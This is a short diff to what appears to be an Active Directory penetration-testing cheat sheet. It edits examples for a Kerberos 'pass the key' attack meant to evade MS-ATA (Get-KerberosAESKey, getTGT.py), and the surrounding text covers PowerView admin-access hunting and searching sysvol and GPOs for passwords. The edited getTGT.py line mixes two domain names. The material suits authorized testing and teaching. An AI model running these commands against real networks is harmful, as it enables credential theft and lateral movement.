@@ -198,7 +198,7 @@ To bypass protections such as MS-ATA use **Pass the key** attack:
 
 ```
 Get-KerberosAESKey -Password somepassword -Salt JAKI.LOCALsomeuser
-getTGT.py scrm.local/ksimpson@scrm.local -aesKey 'yourkey'
+getTGT.py jaki.local/someuser@scrm.local -aesKey 'yourkey'
 # and then Kerberos authentication
 ```
 
@@ -226,7 +226,7 @@ Import-Module .\PowerView.ps1
 Find-LocalAdminAccess -domain jaki.local
 ```
 
-Don't forget the scripts in the **\\jaki.local\sysvol** folder, very often administrators forget about the security of this directory and leave a lot of useful information in it, even passwords for service accounts.
+Don't forget the scripts in the **\\\jaki.local\sysvol** folder, very often administrators forget about the security of this directory and leave a lot of useful information in it, even passwords for service accounts.
 
 Use **PingCastle.exe --healthcheck --server jaki.local** to collect detailed information about the domain, you may find logins and passwords in the GPO.
 
